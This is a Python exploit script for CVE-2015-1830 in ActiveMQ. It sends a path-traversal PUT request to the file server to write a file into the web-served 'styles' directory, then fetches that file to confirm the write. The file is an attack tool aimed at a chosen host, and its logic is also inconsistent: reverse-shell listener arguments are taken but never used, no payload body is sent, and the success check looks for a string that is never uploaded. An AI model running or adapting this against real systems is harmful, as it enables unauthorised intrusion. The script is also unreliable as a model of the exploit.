import argparse
import requests
import sys
import random
import string
import time
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2015-1830
# ActiveMQ unauthenticated RCE.
class CVE2015_1830:

    def __init__(self, host, port, lhost, lport):
        print (LogColors.BLUE + "victim: " + host  + "..." + LogColors.ENDC)
        self.url = "http://" + host + ":" + str(port)
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # generate random filename
    def get_filename(self):
        print (LogColors.BLUE + "get filename..." + LogColors.ENDC)
        self.filename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        print (LogColors.YELLOW + self.filename + LogColors.ENDC)

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload..." + LogColors.ENDC)
        headers = {"Content-Length" : "9"}
        self.session.headers.update(headers)
        r = self.session.put(self.url + "/fileserver/fuck../../..\\styles/{}.txt".format(self.filename))
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

    # trigger
    def trigger(self):
        print (LogColors.BLUE + "trigger..." + LogColors.ENDC)
        r = self.session.get(self.url + "/styles/{}.txt".format(self.filename))
        if r.ok and "xxscan0" in r.text:
            print (LogColors.GREEN + "successfully triggered :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "trigger failed :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.get_filename()
        self.send_payload()
        self.trigger()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-H','--rhost', required = True, help = "target host")
    parser.add_argument('-P','--rport', required = True, help = "target port")
    parser.add_argument('-i','--lhost', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    rhost, rport = args['rhost'], args['rport']
    ip, port = args['lhost'], args['port']
    cve = CVE2015_1830(rhost, rport, ip, port)
    cve.exploit()

